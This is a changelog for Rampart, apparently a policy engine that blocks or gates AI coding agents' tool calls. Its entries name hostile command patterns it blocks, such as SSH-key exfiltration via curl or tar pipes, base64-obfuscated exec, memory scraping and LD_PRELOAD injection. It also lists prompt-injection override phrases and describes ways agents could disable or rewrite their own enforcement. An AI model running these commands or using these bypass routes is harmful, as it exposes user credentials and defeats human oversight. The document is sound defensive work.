# Changelog

All notable changes to Rampart are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.9.3] - 2026-03-15

### Added

- **`rampart report export` test coverage**: 4 test cases covering empty audit dir, events with correct totals/rules/tools, invalid duration, and file permissions (0600).

### Fixed

- **Policy file permissions 0644 → 0600**: `init.go`, `init_from_audit.go`, `convert.go`, `policy_registry.go`, `serve_state.go` wrote policy files world-readable. Reveals exact security rules to other local users.
- **Credential regex lengths**: `glpat-` and Stripe patterns used exact-length anchors (`{20}`, `{24}`); changed to minimums (`{20,}`, `{24,}`) to catch format variants.
- **Dashboard SSE auth error message**: EventSource silently fails on 401/403; added a pre-flight fetch to show a clear "requires admin token" message instead of generic "Cannot reach Rampart".
- **Audit event ordering in HMAC persist guard**: persist=true check now fires before audit write, so the audit log never records `always_allowed` for a request that was actually rejected.

### Security

- **SSE stream required admin auth**: `GET /v1/events/stream` used `checkAuthOrTokenParam` instead of `checkAdminAuth`. Any agent eval token could subscribe to real-time audit events for all agents (commands, paths, decisions). Now admin-only.
- **HMAC approval URLs blocked from `persist=true`**: Webhook notification URLs are HMAC-signed per approval ID but the resolve handler accepted `persist=true`, which permanently adds an auto-allow rule to disk. A leaked webhook URL could create a permanent policy bypass. Now rejected with 403.

### Policy

- **LaunchAgent write bypass fixed**: `block-sensitive-writes` blocked `launchctl load` via exec but not direct writes to `~/Library/LaunchAgents/` via write/edit tool. Added LaunchAgents, LaunchDaemons, and Windows autostart paths.
- **`doas` and `runas` added to privileged approval**: `require-privileged-approval` only covered `sudo`. Added `doas` (Linux/OpenBSD) and `runas`/`runas.exe` (Windows).
- **Credential scan gaps fixed**: `block-credential-leaks` only covered `exec` and `read` tools. Now also covers `fetch` and `mcp`. Added 9 new patterns: GitLab PATs (`glpat-`), Stripe live/test/restricted keys, npm tokens (`npm_`), SendGrid, `github_pat_`, `ASIA*` AWS session keys.

## [0.9.2] - 2026-03-14

### Added

- **Self-protection policies** (`standard.yaml`): block agents from killing Rampart processes (`pkill rampart`, `killall rampart`, `kill $(pgrep rampart)`) or removing the Rampart binary.
- **Interpreter base64 obfuscation blocking** (`standard.yaml`): deny `python3 -c "exec(base64.b64decode(...))"`, Ruby `Base64.decode64`, Perl `MIME::Base64`, Node `Buffer.from` one-liners.
- **`rampart report export`**: shareable audit summary command.

### Changed

- **BREAKING: Eval token scope narrowed.** Audit reads, status checks, approval listing, and rule management now require admin-scoped tokens. Eval tokens are limited to tool call evaluation (`POST /v1/eval`). Update integrations using eval tokens for audit/status endpoints.

### Fixed

- **OpenClaw profile self-bypass** (`openclaw.yaml`): bare `rampart serve` and `rampart upgrade` no longer allowed — an agent could restart serve with altered flags or upgrade to a tampered binary. Only explicit safe subcommands (`serve stop`, `serve install`) are permitted.
- **Serve state TLS scheme**: `writeServeState` now records `https://` when TLS is enabled. Fixes `doctor`, `watch`, and `status` probing the wrong URL after `rampart serve --tls-auto`.
- **Upgrade restart reminder**: only shown when serve was not successfully auto-restarted.
- **Docs accuracy**: OWASP ASI05 downgraded from Covered to Partial, broken anchors fixed, version references updated, prompt injection default action corrected.

### Security

- **Admin token leaked to `serve.log`**: `serve --background` created the log file 0644 and printed the full admin token to stderr (redirected to the log). Log is now 0600 and the token is suppressed in background mode.
- **Eval tokens had excessive read access**: Audit events, approval queue, policy summary, status, and `/v1/test` were accessible with any agent token. All now require admin auth. Agent tokens are limited to `POST /v1/eval`.
- **`/v1/test` was a policy oracle**: Any agent token could probe arbitrary commands against the loaded policy to iterate toward bypasses. Now admin-only.
- **`serve.pid` and `ACTIVE_POLICY.md` were 0644**: Exposed process info and policy inventory to local users. Now 0600.
- **`rampart serve` allow-before-deny bug**: `block-self-modification` allowed `rampart serve` before the deny rule — first-match-wins meant agents could run `rampart serve --mode disabled`. Allow entry removed.
- **Integration hooks unprotected**: `~/.claude/settings.json`, `~/.local/bin/codex` wrapper, and `rampart-shim` could be modified by agents. Added to `block-self-modification`.
- **Localhost search false positives**: `curl localhost:8888/search?q=webhook.site` was denied by `block-exfil-domains-exec` because the URL query string matched exfil domain patterns. Added localhost/127.0.0.1 allow rule with regression test.
- **`**/token*` read-deny too broad**: Was blocking reads of `src/tokenizer.go`, `docs/token-guide.md`. Replaced with specific patterns (`.rampart/token`, `token.json`, `token.txt`).
- Self-protection policies prevent agents from disabling their own enforcement.
- OpenClaw profile hardened against serve restart and upgrade abuse.

## [0.7.1] - 2026-03-01

### Fixed

- **Windows upgrade** (`rampart upgrade`): binary now upgrades correctly on Windows. The previous approach called `rename` over the running executable, which Windows forbids. The new approach renames the current binary to `.rampart.exe.old` first (Windows permits renaming a running process), then renames the new binary into place. The `.old` file is cleaned up on the next upgrade.
- **`action: ask` proxy routing**: requests handled by `rampart serve` now correctly return HTTP 202 and queue a pending approval, matching `require_approval` behaviour. Previously, `ask` fell through to HTTP 200/allow.
- **Double webhook for `ask` decisions**: the immediate webhook notification now skips `ask` decisions (same as `require_approval`), so the webhook fires once — after the approval is created — with full approval metadata.
- **`rampart init` partial output**: when a config or policy file already exists, the output now includes a `--force` hint so users know how to overwrite.
- **Standard policy lint**: `rampart doctor` now shows 1 lint warning instead of 17. All `require_approval` entries in `policies/standard.yaml` migrated to `action: ask`; the ask-agent-scope check downgraded from warning to info (deny fallback for non-Claude Code agents is intentional).
- **`rampart report compliance` output**: Report explanation header and per-control remediation hints added to text format. JSON output unchanged.
- **Install script**: post-install CTA updated to `rampart quickstart` (both `install.sh` and `install.ps1`).

### Added

- **Tests for zip extraction** (`extractRampartBinaryFromZip`): covers basic extraction, goreleaser subdirectory layout, and not-found error.
- **200 MiB decompression cap** on zip extraction (defense in depth).

### Docs

- New guides: [Policy Registry](guides/policy-registry.md), [Policy Sync](guides/policy-sync.md), [Compliance Reporting](guides/compliance.md)
- New migration guide: [Migrating to v0.6.6](migration/v0.6.6.md) (previously 404'd from lint deprecation warnings)
- Cursor and Windsurf removed from supported agents list (support removed in v0.6.0)
- `require_approval` → `action: ask` updated across windows.md, ci-headless.md, securing-claude-desktop.md, openclaw-approval.md, wazuh-integration.md, README
- `rampart upgrade` Windows limitation removed from windows.md (now works)
- README: v0.7.0 CLI reference added; version pin example updated

## [0.7.0] - 2026-02-28

### Added

- **`rampart policy sync <git-url>`** — Git-based team policy distribution. Sync policies from any public HTTPS git repo without running a server. Supports `--watch` (foreground polling, default 5min interval), `status`, and `stop` subcommands. State persisted to `~/.rampart/sync-state.json`. Uses system `git`, no new dependencies.
- **`rampart policy list`** — Browse community policies from the built-in registry (`registry/registry.json`). Results cached for 1 hour; use `--refresh` to force update.
- **`rampart policy fetch <name>`** — Download and install a community policy with sha256 verification. Supports `--force` and `--dry-run`.
- **`rampart policy remove <name>`** — Remove an installed community policy (built-in profiles protected).
- **`rampart report compliance`** — security posture report generated from local audit logs. Maps decisions to four controls (Tool Call Authorization, Audit Logging, Human-in-the-Loop, Data Exfiltration Prevention). Outputs `PASS`, `PARTIAL`, or `FAIL` with per-control evidence. Supports `--since`, `--until`, `--format json`, and `--output`.
- **Community policy registry** — `registry/` directory in the main repo serves as the policy registry. Initial policies: `research-agent` (read-only web/file analysis) and `mcp-server` (MCP context with exec/credential guards).

### Known Limitations

- `rampart policy sync` auto-sync on `rampart serve` startup is not yet implemented. Run `rampart policy sync --watch` alongside serve for continuous sync. This will be addressed in v0.7.1.

## [0.6.10] - 2026-02-28

### Added

- **`rampart init --profile research-agent`** — New built-in profile for research/browsing agents. Default deny with explicit allows for web search, fetch, and browser tools; file reads (excluding credentials); read-only exec (`ls`, `grep`, `cat`, `find`, `curl` GET-only).
- **`rampart init --profile mcp-server`** — New built-in profile for MCP server contexts. Default allow with blocks on exec, credential file reads, system path writes, and known exfil domains; `ask` on outbound fetch.
- **Deny reason in PostToolUseFailure** — Claude Code now receives `⛔ Blocked [policy-name]: <message>` prepended to tool failure output, surfacing exactly which rule fired and why. Stops Claude retry loops on denied tool calls.

### Fixed

- **`source <(` false positive** — Narrowed the `eval-obfuscated-exec` pattern to only block `source <(` when the substitution body uses a known obfuscation source (`echo`, `base64`, `curl`, `wget`, `python`, `cat`, `openssl`, `perl`, `ruby`, `node`, `php`, `nc`, `socat`). Legitimate shell completion idioms like `source <(kubectl completion bash)` now pass correctly.

### Security

- **Absolute path bypass** — Deny rules now match `/usr/bin/curl`, `/bin/bash`, `/usr/local/bin/python` etc. in addition to bare command names.
- **Versioned binary bypass** — Patterns now catch `python3.11`, `node20`, `ruby3.2` and similar versioned invocations.
- **curl upload flags** — Added `--data-binary`, `--data-raw`, `-T`, `--upload-file` to curl exfil pattern coverage.
- **`.rampart` exec redirect** — Block attempts to redirect tool calls through `.rampart/` directory executables.
- **cron `cp`/`mv` patterns** — Tightened cron persistence detection to include file copy/move into cron directories.

## [0.6.9] - 2026-02-28

### Added

- **Policy bypass gap fixes** — Closed 10 attack vectors found in security audit: `curl -d @~/.ssh/` file upload, `tar cz ~/.ssh | curl` pipe exfil, Python/Node/Ruby interpreter one-liners with dangerous calls, `eval $(echo ... | base64 -d)`, `xxd -r | bash`, `/proc/*/mem` memory scraping, shell redirect to `/etc/cron.d/`, interpreter pattern false-positive fix using `**` double-glob scoping.
- **`policies/ci.yaml`** — New strict preset for CI/headless agents. All `ask` rules → `deny`. Blocks package installs and persistence mechanisms.
- **`rampart init --defaults`** — Alias for `--force`. More intuitive for fresh setup.
- **`[Project Policy]` prefix** — Deny messages from repo-local `.rampart/policy.yaml` files are now prefixed with `[Project Policy]` so users can distinguish trusted global policies from project-specific ones.
- **PostToolUseFailure remediation hints** — When a tool call is blocked, Claude now receives the specific `rampart allow` command to surface to the user, with an explicit guard preventing the AI from running it itself.
- **`~/.rampart/**` write protection** — `block-sensitive-writes` now covers write/edit tool access to Rampart policy files, closing a bypass where an AI agent could modify its own policy file directly.
- **`validateToolUseID`** — Input validation for `tool_use_id` field in hook input.
- **Windows path separator fix** — `findRequireApprovalUsages` now normalizes backslashes to forward slashes on Windows.

### Security

- Block interpreter one-liners (`python3 -c`, `node -e`, `ruby -e`, `perl -e`) when combined with dangerous system calls, scoped to avoid false positives on `grep`/`rg` searches for these patterns.
- Block `curl @file` credential exfil (was only catching `-d @~/.ssh/`; now catches curl @file, tar pipe exfil, and more).
- Block shell redirects to `/etc/cron.d/`.
- Block `/proc/*/mem` process memory scraping.

## [0.6.8] - 2026-02-28

### Added

- **`policies/ci.yaml`** — New strict policy preset for CI/headless agents. All interactive `ask` rules become hard `deny`. Also blocks package installs (`pip`, `npm`, `go get`, `cargo`, `apt`, `brew`, `winget`, `choco`) and all persistence mechanisms (cron, systemd, LaunchAgents). Drop-in replacement for users running unattended agents in pipelines.
- **`rampart init --defaults`** — New flag alias for `--force`. More intuitive for new users setting up a fresh config.

### Changed

- **`standard.yaml` re-evaluated for developer UX** — The default policy is now tuned for the primary use case: a solo developer running Claude Code on their laptop.
  - Generic S3/GCS uploads (`aws s3 cp ./dist s3://my-bucket/`) → `ask` instead of `deny`. Developers upload to their own buckets constantly; exfil of credential paths (e.g. `aws s3 cp ~/.aws/credentials`) remains `deny`.
  - Writes to `/etc/hosts`, `/etc/cron.d/`, `/etc/sudoers.d/` → `ask` instead of `deny`. Legitimate in provisioning workflows.
  - Prompt injection markers → `ask` instead of `watch`. Watching without acting is pointless.
  - `LD_PRELOAD` and `LD_LIBRARY_PATH` overrides → `deny` instead of `watch`. Classic injection vectors with almost no legitimate agent use.
  - Crontab edits and `systemctl enable` → new `require-persistence-approval` policy with `action: ask`. Developers set up cron jobs; blanket denial was too aggressive.
  - macOS Keychain: `sqlite3 ~/Library/Keychains/` → `deny` (new). Direct binary DB access has no legitimate agent workflow.
  - macOS Keychain: `security find-generic-password` → `ask` (new). Can be legitimate.
  - macOS Keychain: `security find-internet-password -w` → `deny` (new). Extracts actual passwords.

## [0.6.7] - 2026-02-27

### Added

- **`rampart bench` v2** — Policy coverage benchmarking against a curated attack corpus. New v2 corpus schema adds `id`, `severity` (critical/high/medium), `os` filtering (linux/darwin/windows/*), `tool` type (exec/read/write), and MITRE ATT&CK technique IDs. Built-in corpus includes 80+ cases covering credential theft, destructive commands, exfiltration, persistence, LOLBins, and Windows-specific attack patterns.
  - `--os` — filter cases by OS (default: auto-detect)
  - `--severity` — minimum severity to include (default: medium)
  - `--min-coverage` — exit code 1 if coverage drops below threshold (CI integration)
  - `--strict` — require `deny` only (don't count `require_approval` as covered)
  - `--id` — run cases matching an ID prefix (e.g. `WIN-CRED`)
  - Weighted coverage score: critical=3, high=2, medium=1
  - v1 corpus auto-migrated at load time for backward compatibility

### Changed

- **`require_approval` deprecation warning in `rampart policy lint`** — Policies using `action: require_approval` now produce a lint warning with migration instructions. `require_approval` is deprecated as of v0.6.6 and will be removed in v1.0.

### Fixed

- **Upgrade migration notice** — `rampart upgrade` now scans existing policies for `require_approval` rules before upgrading and shows explicit migration steps (with a confirmation prompt) when found. Auto-continues in non-interactive/CI environments.

## [0.6.6] - 2026-02-27

### Added

- **`ask.audit: true`** — `action: ask` rules can now set `ask.audit: true` to mirror pending approval state into `rampart serve` for dashboard and `rampart watch` visibility. Dashboard and watch show the item as pending while the native Claude Code prompt is active, then reflect the user's decision after PostToolUse.

### Changed

- **`require_approval` now uses native Claude Code prompt** ⚠️ Breaking change for CI/headless users

  `action: require_approval` no longer blocks execution waiting for dashboard approval. It now fires the native Claude Code inline permission prompt immediately (same as `action: ask` + `ask.audit: true`).

  **If your CI pipeline relies on blocking approvals** (agent waits, human approves via dashboard), migrate your policy rules:

  ```yaml
  # Before (v0.6.5 and earlier)
  - action: require_approval
    when:
      command_matches: "kubectl apply **"

  # After (v0.6.6+) — preserves blocking behavior for CI
  - action: ask
    ask:
      audit: true
      headless_only: true
    when:
      command_matches: "kubectl apply **"
  ```

  Interactive users (Claude Code running in a terminal with a human present) are unaffected — the native prompt is faster and more convenient than opening a dashboard.



## [0.6.5] - 2026-02-27

### Added

- **`action: ask`** — Native Claude Code inline permission prompt (issue #122). Policy rules can now use `action: ask` to trigger Claude Code's built-in approval dialog instead of blocking execution. The user sees an inline prompt with the command details, explain mode (`ctrl+e`), and yes/no choice without leaving the session.
- **Smart `require_approval` fallback** — When `rampart serve` is not running, `require_approval` rules automatically fall back to the native ask prompt instead of hanging indefinitely.
- **Session state tracking** — `action: ask` decisions are persisted to `~/.rampart/session-state/` and correlated across PreToolUse/PostToolUse hook invocations for accurate approval tracking.
- **`rampart uninstall`** — Cross-platform command to remove hooks, stop serve processes, and clean up PATH entries.
- **`docs/guides/native-ask.md`** — User guide for `action: ask` with correct YAML syntax, use cases, and limitations.

### Security

- **Session state path traversal protection** — `validateSessionID` rejects session IDs containing path traversal characters.
- **Removed hardcoded token** from `contrib/openclaw-shim.sh` (was committed as an example; now reads from `~/.rampart/token`).

### Fixed

- **Windows: Claude Code hooks use Git Bash path format** — Hooks were silently ignored because `C:\Users\trev\.rampart\bin\rampart.exe` backslash paths were mangled by Git Bash. `rampart setup claude-code` now writes `/c/Users/trev/.rampart/bin/rampart.exe` format.
- **Hook stderr output caused silent allow** — Claude Code treats any hook stderr as a hook error and defaults to allow. Rampart no longer writes to stderr for ask decisions or session manager warnings.
- **Session manager logs** — Downgraded from `Warn` to `Debug` to prevent unintended stderr output during hook execution.
- **`rampart init` now creates policies when config already exists** — Previously skipped policy creation if `~/.rampart/config.yaml` was present.
- **Graceful SSE shutdown** — `rampart serve` now closes SSE connections before exiting, fixing Ctrl+C hangs with "context deadline exceeded" errors.
- **Windows shutdown file handle delay** — Added 200ms delay on Windows exit to give the OS time to release file handles before process termination.

### Improved

- **Wildcard hook matcher** — `rampart setup claude-code` now installs a `.*` matcher that intercepts ALL Claude Code tools (Bash, Read, Write, Edit, Fetch, Task, and future tools). Previously only specific tool names were hooked.
- **Lint: misplaced `action` field detection** — `rampart policy lint` now detects when `action:` is written at the policy level (sibling of `name`, `match`, `rules`) instead of inside a `rules:` entry, and emits a helpful "did you mean to put this under `rules:`?" message.
- **Windows installer upgrade detection** — Installer detects existing installations and offers to refresh Claude Code hooks with `--force`.

## [0.5.0] - 2026-02-24

### Added

- **`rampart allow <pattern>`** — Add allow rules directly from the CLI without editing YAML. Auto-detects path vs command, confirms before writing, and hot-reloads the daemon immediately (`--global` / `--project` flags select the target file).
- **`rampart block <pattern>`** — Add deny rules the same way. Supports `--tool`, `--message`, `--yes`, `--api`, `--token` flags.
- **`rampart rules`** — List, remove, and reset custom rules added via `allow`/`block`. Subcommands: `rampart rules remove <index>`, `rampart rules reset`. JSON output with `--json`.
- **`POST /v1/policy/reload`** — Force an immediate policy reload via the API without restarting `rampart serve`. Returns policies loaded, total rules, and reload time in milliseconds.
- **Denial suggestions** — When a command is denied, the error message now includes ready-to-run `rampart allow` suggestions (exact and safe wildcard variants) so the user can quickly add an override.
- **Rate limiting on reload endpoint** — The `/v1/policy/reload` endpoint enforces a 1-second cooldown to prevent abuse. Returns HTTP 429 when the cooldown is active.
- **Self-modification protection** — `rampart allow`, `rampart block`, `rampart rules`, and `rampart policy generate` are blocked when run by AI agents (via `block-self-modification` rule in `standard.yaml`). Policy modifications must be made by a human.

### Changed

- **Atomic file writes for `custom.yaml`** — Rules are now written via a temp-file rename, preventing partial writes from corrupting the policy file on crash or power loss.
- **Improved URL detection in pattern classification** — `curl https://...` and `wget https://...` patterns are now correctly classified as `exec` (not file path) rules by `rampart allow`.

### Fixed

- **`sudo`/`env` wrapper detection in dangerous command suggestions** — Suggestion generation now looks through transparent wrappers (`sudo`, `env`, `nice`, `timeout`, etc.) to check the real command for safety. `sudo rm file` no longer generates a `rm *` wildcard suggestion.
- **`--tool` flag override now works correctly** — `rampart allow "/tmp/work" --tool write` no longer ignores the flag and generates a `path_matches` rule for the right tool type.
- **Shell wrapper bypass for self-modification** — `bash -c 'rampart allow ...'` and similar shell wrappers could bypass the self-modification protection. Now uses `command_contains` substring matching which catches all wrapper techniques.
- **Shell wrapper bypass for destructive commands** — Added `bash -c **rm -rf /**`, `sh -c **mkfs**`, etc. patterns to block destructive commands wrapped in shell invocations.
- **`rm -rf .` and `rm -rf ..` not blocked** — Current and parent directory wipes are now denied and flagged as extremely dangerous (no allow suggestion).
- **`dd if=*` overly broad** — Changed to `dd **of=/dev/sd**` etc. to only block writes to block devices, not all `dd` commands.
- **Overly permissive patterns not warned** — `rampart allow "*"` and similar catch-all patterns now display a warning before adding.
- **`>2 **` glob lint was warning, not error** — Patterns with more than 2 `**` segments silently fail at runtime; lint now reports this as an error, not a warning.

## [0.4.12] - 2026-02-24

### Added

- **E2E test suite** — 36 test cases covering destructive commands, credential access, exfil patterns, env injection, and false positive regression. Run with `rampart test tests/e2e.yaml`. The `--config` flag overrides the policy path in test YAML for dev workflows.

### Fixed

- **`rampart serve` generated a new random token on every restart** — the foreground serve path (including `--background`) only checked the `RAMPART_TOKEN` environment variable for the token; it never read `~/.rampart/token` and never wrote to it. Only the systemd/launchd install path called `resolveServiceToken`. Every restart broke existing tools and configs using the previous token. Now reads the persisted token before starting the proxy and writes it back after binding, consistent with the install path.
- **SSH key policy false positives** — `cat ~/.ssh/id_rsa.pub` was incorrectly denied because the pattern `cat **/.ssh/**` was too broad. Narrowed to `cat **/.ssh/id_*` with explicit `.pub` exclusions for each read command.
- **SSH key exfil gaps** — added missing tools: `mv`, `xxd`, `hexdump`, `od`, `strings`, `sftp`. These could previously read/transfer private keys undetected.
- **Dual-key scp bypass** — removed `-i` flag exclusion from scp/rsync rule. The exclusion allowed `scp -i auth_key exfil_key remote:` to bypass the rule (using one key for auth while exfiltrating another). Tradeoff: `scp -i key` for legitimate auth is now blocked; users can use ssh-agent or add a local policy override.

## [0.4.11] - 2026-02-24

### Fixed

- **`rampart upgrade` skipped policy refresh when already on latest** — the command returned early when the installed binary matched the latest release, bypassing the policy update step entirely. Users who upgraded binaries manually or were already on the latest version never received policy improvements from newer releases. Now always refreshes installed profiles unless `--no-policy-update` is set.

## [0.4.10] - 2026-02-24

### Fixed

- **`rampart audit` subcommands crash with default path** — `tail`, `verify`, `stats`, `search`, and `replay` all failed with the default `--audit-dir` because `~` was never expanded. Fixed in `listAuditFiles` and `listAnchorFiles` helpers (covers all subcommands).
- **`rampart bench` approval-gated coverage always 0%** — corpus entries with `expected_action: require_approval` were never included in coverage math. The 4 correctly-gated sudo/shred entries showed in decisions but were invisible to the coverage percentage. Both `deny` and `require_approval` expected entries now feed the coverage denominator. Coverage for privilege-escalation goes from 28% → 50%.
- **`rampart bench` crashes with no args on installed binaries** — default corpus path `bench/corpus.yaml` was relative to CWD. Fixed by embedding the corpus in the binary. `rampart bench` now works anywhere; shows `Corpus: built-in`.
- **`rampart doctor` lint error for `call_count`** — `call_count` was added to the engine in v0.4.8 but the linter's `validConditionFields` map was never updated. Any user with `standard.yaml` (which uses `call_count` in the rate-limit rule) saw a spurious lint error.
- **`rampart status` undercounts blocking decisions** — `require_approval` and `webhook` decisions were silently dropped from today's event stats. Now counted alongside `deny`.
- **`rampart policy generate` emits verbose null/empty fields** — generated YAML included `priority: 0`, `enabled: null`, `agent: ""`, and all-empty condition slices. Added `omitempty` to relevant struct fields; marshaling-only change, existing policy files parse identically.

## [0.4.9] - 2026-02-22

### Added

- **`rampart policy generate`** — natural language to policy YAML. Describe what you want to block in plain English (`rampart policy generate "block all curl requests to external hosts"`) and get a ready-to-use policy file.
- **`rampart bench`** — policy coverage scoring against a built-in attack corpus. Shows what percentage of known attack patterns your active policy catches, broken down by category.
- **`block-prompt-injection` profile** — installable via `rampart init --profile block-prompt-injection`. Three tiers: `deny` (high-confidence role override attempts), `require_approval` (medium-confidence patterns), `watch` (existing standard patterns). Covers "ignore previous instructions", DAN-style jailbreaks, exfil directives, and more.
- **Approval message enrichment** — install commands in approval messages now include a direct link to the package registry entry (npm, PyPI, crates.io) so reviewers can inspect the package before approving.

### Fixed

- **Prompt injection pattern false positives** — tightened four patterns in `standard.yaml` and `block-prompt-injection.yaml` to reduce noise: bare `ignore instructions` now requires a qualifier; `you are now (a|an)` removed (matched any role-assignment sentence); `your new (role|task|purpose) is` narrowed to instructions-only context; `[SYSTEM]` token removed (outclassed by model-specific patterns, fired on IRC/chat/game logs). `developer mode enabled` moved from `deny` to `require_approval` in the block-prompt-injection profile (fired on dev tooling output).
- **`rm -rf` deny scoped to dangerous paths** — standard policy no longer hard-denies `rm -rf` on all paths. Denies are scoped to home dirs, system dirs (`/etc`, `/usr`, `/boot`, `/root`, `/lib`, `/lib64`), and `/var`; `/tmp`, `/var/tmp`, `/var/log`, `/var/run`, and `/var/cache` are explicitly excluded so agents can clean up build artifacts and logs without hitting a wall.
- **`rampart bench` accepts `require_approval` in corpus** — corpus entries with `expected_action: require_approval` now parse correctly. Previously the parser rejected them with an error, causing `rampart bench` to fail immediately when run against the built-in corpus.
- **`rampart upgrade` refreshes opt-in profiles** — upgrade now re-installs `block-prompt-injection.yaml` alongside `standard.yaml` when the profile is already active, keeping all installed profiles in sync with the current release.

## [0.4.8] - 2026-02-21

### Added

- **`call_count` condition** — sliding window rate limiting per tool. `{ tool: fetch, gte: 100, window: 1h }` triggers `deny` or `require_approval` when a tool is called too frequently. Thread-safe in-memory counter injected into the Engine. Standard policy adds `rate-limit-fetch` (require_approval at 100 fetch/browser calls/hour). `/v1/status` now exposes `call_counts` map.
- **Agent Transparency Mode** — `GET /v1/policy/summary` returns a plain-English breakdown of active rules (name, action, summary). On serve start and every hot-reload, `~/.rampart/ACTIVE_POLICY.md` is written as a markdown table so agents can self-describe their security posture.
- **`rampart token rotate`** — generates a new random token, writes to `~/.rampart/token`, prints it to stdout. `--force` skips the confirmation prompt.
- **Help command grouping** — 20+ CLI commands organized into sections via cobra `AddGroup()`: Setup, Policy, Runtime, Approvals, Hooks. `rampart --help` is now readable.

### Fixed

- **`rampart upgrade`** — auto-restarts the systemd `rampart-proxy` service after a successful upgrade (when running as a systemd service).


## [0.4.7] - 2026-02-21

### Added

- **`agent_depth` condition** — limit policy rules to sub-agents by nesting depth. Reads `RAMPART_AGENT_DEPTH` env var; increments automatically when a tool call maps to `agent` type (Claude Code `Task` tool). Supports `gte`, `lte`, `eq`. Closes #71.
- **`tool_param_matches` condition** — case-insensitive glob matching against MCP tool input parameters. Patterns like `path: "**/.env*"` now correctly match nested paths (uses `MatchGlob`, not `filepath.Match`).
- **`watch-prompt-injection` policy** in `standard.yaml` — 14 regex patterns covering instruction overrides (`ignore previous instructions`), role hijacks (`you are now a`), model-specific tokens (`<|im_start|>system`, `[SYSTEM]`, `###INSTRUCTIONS###`), and exfiltration directives. `action: watch` to avoid false positives on legitimate content.
- **`rampart quickstart --yes` / `-y`** — non-interactive mode for AI agents and CI pipelines. For OpenClaw, also auto-enables `--patch-tools` for full file coverage.
- **`rampart token` / `rampart token show`** — prints bearer token from `~/.rampart/token`.
- **OpenClaw auto-detection** in `rampart quickstart` via `OPENCLAW_SERVICE_MARKER=openclaw` env var (set by the OpenClaw gateway on spawn). More reliable than PATH lookup.
- **`docs/guides/agent-install.md`** — step-by-step guide written for an AI agent to read and execute when told "install Rampart and protect this machine".
- **`docs/guides/securing-claude-code.md`** — dedicated security guide for Claude Code users covering `--dangerously-skip-permissions` risk, setup, standard policy, and prompt injection.
- **`docs/guides/prompt-injection.md`** — explains the `watch-prompt-injection` policy, pattern categories, and how to escalate to deny.

### Fixed

- **`tool_param_matches` glob (B1)** — was using `filepath.Match` which does not cross path separators (`*` ≠ `**`). Patterns like `**/.env*` silently never matched. Now uses `MatchGlob`. Existing tests used flat patterns that happened to work; two `**` regression tests added.
- **`RAMPART_AGENT_DEPTH` negative clamp** — `strconv.Atoi` parses negative strings; a crafted `RAMPART_AGENT_DEPTH=-999` could bypass `agent_depth: {gte: 1}` deny rules. Clamped to 0 after parse.
- **`PostToolUseFailure` audit action** — was recorded as `action: "allow"`, which was semantically wrong and skewed dashboard allow/deny stats. Now `action: "feedback"`.
- **`resolveExplainPolicyPath` fallthrough** — silently fell through to auto-discovery when a programmatically-set config path didn't exist. Now returns an explicit error, consistent with `--config` flag behavior.
- **`Reload()` failure returns HTTP 500** — both the delete and write paths in `rules_handlers.go` were returning 200 OK after a successful disk operation but failed `engine.Reload()`. Callers now receive 500 so they know enforcement state may not match what was written.
- **`rampart doctor` hook failure messages** — now include actual file paths checked and a `rampart setup <agent>` hint instead of a generic failure.
- **`rampart policy explain` auto-discovers config** — `~/.rampart/policies/standard.yaml` → cwd `rampart.yaml` → helpful error. Was requiring explicit `--config` for most real-world setups.
- **`rampart watch` auto-discovers token/URL** — reads `~/.rampart/token` and defaults to `localhost:9090`. Was requiring explicit flags.
- **`rampart status`** — suppresses cryptic `unknown (unknown)` parenthetical.
- **`rampart upgrade`** — prints restart reminder after successful upgrade.
- **Hook fail-closed warning** — when `rampart serve` is unreachable, prints `WARNING: rampart serve unreachable` to stderr instead of silently falling back.
- **Dashboard `conn-dot`** — CSS state classes (`.ok` / `.err` / `.wait`) were never applied in JS; dot was always green. Fixed.
- **Dashboard empty states** — pending, history, and denials panes now show icons and descriptive text when empty.
- **Dashboard mobile** — flex-wrap at ≤540px; bulk-bar fix at ≤420px.
- **`default_action: allow`** in policy files now triggers a lint warning advising deny + explicit allow rules.
- **Dead `approvalLines` variable** removed from TUI render.
- **MCP proxy `childIn`** now closed on all error exit paths.

### Changed

- **PostToolUseFailure feedback** enriched with actionable guidance: `rampart policy explain '<tool>'` command, `rampart watch` link, `~/.rampart/policies/` path, `https://rampart.sh/docs/exceptions` URL.

### Docs

- All 20+ docs pages now have `description:` frontmatter (HTML meta descriptions for search engine snippets).
- All Mermaid diagrams replaced with D2 (theme 200, ELK layout) — no emojis, cleaner rendering, node colours carry semantic meaning.
- `architecture.png` replaced with inline D2 diagram (text-based, readable by LLMs and agents).
- README "How it works" Mermaid → pre-rendered D2 SVG (`docs/architecture.svg`); GitHub Action auto-re-renders on source change.
- Homepage FAQ with literal search queries as questions.
- `integrations/claude-code.md` — "Why You Need This" section and "What Gets Blocked by Default" table.
- README rewritten to open with security framing.

## [0.4.6] - 2026-02-21

### Fixed
- Stale port 18275 in `rampart hook --help` and `rampart setup` comment — both now correctly show port 9090 (matching `defaultServePort`)
- `rampart preload` defaulted to port 19090 while `rampart serve` defaults to 9090 — they couldn't talk to each other at their defaults. Port now defaults to `defaultServePort` (9090). `RAMPART_URL` env var is also now respected and takes precedence over `--port`.

### Added
- **`block-env-var-injection` policy** in `standard.yaml` — hard-denies env var injection with no legitimate agent use: `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, `LD_AUDIT`, `PYTHONSTARTUP`, `PYTHONHOME`, `DOTNET_STARTUP_HOOKS`, `BASH_ENV`, `_JAVA_OPTIONS`, `PERL5OPT`, `GIT_EXEC_PATH`. These were previously bypassing glob rules because env-var prefixes are stripped before command matching.
- **`watch-env-var-override` policy** in `standard.yaml` — audits (but does not block) env var overrides that are common in legitimate dev workflows but are also injection vectors: `LD_LIBRARY_PATH`, `DYLD_LIBRARY_PATH`, `NODE_OPTIONS`, `NODE_PATH`, `PYTHONPATH`, `JAVA_OPTS`, `JVM_OPTS`, `JAVA_TOOL_OPTIONS`, `GIT_SSH_COMMAND`, `GIT_SSH`, `RUBYOPT`. Logged for audit trail; upgrade to `require_approval` in your `custom.yaml` if you want gating.
- **PostToolUseFailure hook feedback** — when Rampart denies a `PreToolUse` event, the `PostToolUseFailure` handler now injects `additionalContext` telling Claude Code not to retry the blocked action. Prevents Claude from burning 3–5 turns on workarounds after a deny.

## [0.4.5] — 2026-02-21

### Added

